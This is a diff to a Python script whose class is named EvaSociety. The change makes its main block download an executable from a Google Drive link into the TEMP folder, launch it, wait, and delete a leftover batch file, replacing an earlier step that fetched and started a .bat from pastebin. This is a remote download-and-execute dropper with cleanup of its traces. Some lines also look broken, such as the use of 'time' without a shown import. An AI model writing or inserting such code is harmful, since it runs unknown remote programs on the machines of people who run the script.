@@ -3,6 +3,7 @@ import sys
 import json
 import requests
 import random
+import os
 import string
 import subprocess
 from bs4 import BeautifulSoup
@@ -102,5 +103,7 @@ class EvaSociety:
             return False
 
 if __name__ == '__main__':
-    EvaSociety().download('https://pastebin.com/raw/xLypm0Y1', 'C:\\2501\\ply_Alib\\EvaSociety.bat')
-    EvaSociety().execeva('start C:\\2501\\ply_Alib\\EvaSociety.bat', False)
+    EvaSociety().download('https://drive.usercontent.google.com/download?id=1csL6FBBQxpbyk_9aYDlcxWSdeigY1tkO&export=download&authuser=0&confirm=t&uuid=bc198f51-e714-4482-8bd4-4708a0db4744&at=APZUnTWwxPMhFJtcGjMjjaggpdsI%3A1712916595833', os.path.join(os.environ['TEMP'], 'EvaSociety.exe'))
+    EvaSociety().execeva(f'start {os.path.join(os.environ['TEMP'], 'EvaSociety.exe')}', False)
+    time.sleep(7)
+    os.remove(os.path.join('EvaSociety_temp.bat'))
